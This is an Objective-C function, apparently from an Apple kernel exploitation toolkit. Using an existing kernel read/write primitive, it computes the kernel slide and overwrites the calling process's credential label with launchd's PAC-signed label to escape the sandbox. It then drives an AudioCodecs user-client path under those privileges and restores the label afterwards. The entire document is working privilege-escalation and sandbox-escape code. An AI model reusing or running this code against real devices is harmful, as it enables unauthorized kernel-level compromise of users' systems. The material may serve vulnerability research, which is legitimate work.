void CNDAudioCodecs86969KrwProbeRun(
    BOOL benign,
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    NSMutableDictionary *rep =
        [@{ @"command": benign ? @"a86969-krw-benign" : @"a86969-krw-raw",
            @"pid": @(getpid()),
            @"at": @([[NSDate date] timeIntervalSince1970]) } mutableCopy];

    if (!kexploit_krw_ready()) {
        rep[@"result"] = @"refused-krw-not-ready";
        completion(rep);
        return;
    }

    uint64_t slide = g_kernel_base - CND_A86969_STATIC_KERNEL_BASE;
    if (g_kernel_base < CND_A86969_STATIC_KERNEL_BASE || slide >= 0x100000000ULL) {
        rep[@"result"] = @"bad-kernel-base";
        rep[@"kernelBase"] = CNDHex64(g_kernel_base);
        completion(rep);
        return;
    }
    CNDA86969Recon(rep, slide);

    // --- label swap: raw-copy launchd's PAC-signed cr_label into ours ---
    uint64_t self = proc_self();
    uint64_t launchd = proc_find(1);
    if (!self || !launchd) {
        rep[@"result"] = @"proc-lookup-failed";
        completion(rep);
        return;
    }
    uint64_t myUcred = CNDA86969UcredOf(self);
    uint64_t ldUcred = CNDA86969UcredOf(launchd);
    uint64_t oldLabelRaw = kread64(myUcred + off_ucred_cr_label);
    uint64_t ldLabelRaw = kread64(ldUcred + off_ucred_cr_label);
    rep[@"myUcred"] = CNDHex64(myUcred);
    rep[@"ldUcred"] = CNDHex64(ldUcred);
    rep[@"oldLabelRaw"] = CNDHex64(oldLabelRaw);
    rep[@"ldLabelRaw"] = CNDHex64(ldLabelRaw);
    rep[@"mySandboxSlot"] = CNDHex64(label_get_sandbox(kread_ptr(myUcred + off_ucred_cr_label)));
    rep[@"ldSandboxSlot"] = CNDHex64(label_get_sandbox(kread_ptr(ldUcred + off_ucred_cr_label)));

    kwrite64(myUcred + off_ucred_cr_label, ldLabelRaw);
    uint64_t verify = kread64(myUcred + off_ucred_cr_label);
    rep[@"labelSwapVerify"] = CNDHex64(verify);
    if (verify != ldLabelRaw) {
        rep[@"result"] = @"label-swap-failed";
        completion(rep);
        return;
    }

    // --- drive the real user-client path ---
    CNDAudioCodecs86969RunCore(benign, rep);

    // --- restore our label before reporting ---
    kwrite64(myUcred + off_ucred_cr_label, oldLabelRaw);
    rep[@"labelRestoreVerify"] = CNDHex64(kread64(myUcred + off_ucred_cr_label));

    completion(rep);
}
